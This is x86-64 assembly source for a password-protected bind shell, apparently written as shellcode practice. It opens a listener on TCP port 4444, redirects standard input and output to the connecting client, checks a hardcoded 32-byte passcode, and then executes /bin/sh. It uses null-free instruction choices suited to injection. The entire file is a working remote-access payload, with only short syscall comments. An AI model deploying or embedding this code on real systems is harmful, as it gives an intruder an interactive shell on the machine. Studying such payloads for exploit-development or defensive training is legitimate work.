

global _start


_start:

    jmp main
    ask_pass: db "Tell me the passcode", 0xa

main:

	; sock = socket(AF_INET, SOCK_STREAM, 0)
	; AF_INET = 2
	; SOCK_STREAM = 1
	; syscall number 41 

    xor rdx, rdx
    mul rdx ; zeroes rax
	add al, 41
	mov dil, 2
	mov sil, 1
	;mov rdx, 0 
	syscall

	; copy socket descriptor to rdi for future use 

	mov rdi, rax


	; server.sin_family = AF_INET 
	; server.sin_port = htons(PORT)
	; server.sin_addr.s_addr = INADDR_ANY
	; bzero(&server.sin_zero, 8)

	xor rax, rax 

	push rax

	mov dword [rsp-4], eax
	mov word [rsp-6], 0x5c11
	mov byte [rsp-8], 0x2
	sub rsp, 8


	; bind(sock, (struct sockaddr *)&server, sockaddr_len)
	; syscall number 49

	mov al, 49
	
	mov rsi, rsp
	mov dl, 16
	syscall


	; listen(sock, MAX_CLIENTS)
	; syscall number 50

	mov al, 50
	mov sil, 2
	syscall


	; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
	; syscall number 43

	
	mov al, 43
	sub rsp, 16
	mov rsi, rsp
    mov byte [rsp-1], 16
    sub rsp, 1
    mov rdx, rsp

    syscall

	; store the client socket description 
	mov r9, rax 

    ; close parent

    mov al, 3
    syscall

    ; duplicate sockets

    ; dup2 (new, old)
    mov rdi, r9
    mov al, 33
    xor rsi, rsi
    syscall

    mov al, 33
    ;mov rsi, 1
    inc rsi
    syscall

    mov al, 33
    ;mov rsi, 2
    inc rsi
    syscall

    ; ############ asking for password ------------------------------

    password:

    ; sys_write
    ; rax : 1 - write syscall number
    ; rdi : unsigned int fd : 1 for stdout
    ; rsi : const char *buf : password buffer
    ; rdx : size_t count : password size
    xor rax, rax
    xor rdx, rdx ; or cqo??
    inc rax
    mov rdi, rax
    lea rsi, [rel ask_pass]
    mov dl, 21
    syscall


    ; sys_read
    ; rdi : unsigned int fd : 0 for stdin
    ; rsi : char *buf : stack?
    ; rdx : size_t count : how big

    xor rdx, rdx
    xor rax, rax
    xor rdi, rdi


    ; rax is already zero
    mov rsi, rsp
    add rdx, 32 ;password size
    syscall

    mov rdi, rsp
    xor rsi, rsi
    push rsi
    mov rsi, 0x646f6f6f676f6e6f
    push rsi
    mov rsi, 0x7470756d61697461
    push rsi
    mov rsi, 0x6874726165777379
    push rsi
    mov rsi, 0x6c6e6d656c6f7369
    push rsi
    mov rsi, rsp    ; password buffer pointer
    xor rcx, rcx
    add cl, 32
    repe cmpsb
    jne password


    ; ###### ------------------------------------------

    ; execve

    ; First NULL push

    xor rax, rax
    push rax

    ; push /bin//sh in reverse

    mov rbx, 0x68732f2f6e69622f
    push rbx

    ; store /bin//sh address in RDI

    mov rdi, rsp

    ; Second NULL push
    push rax

    ; set RDX
    mov rdx, rsp


    ; Push address of /bin//sh
    push rdi

    ; set RSI

    mov rsi, rsp

    ; Call the Execve syscall
    add rax, 59
    syscall

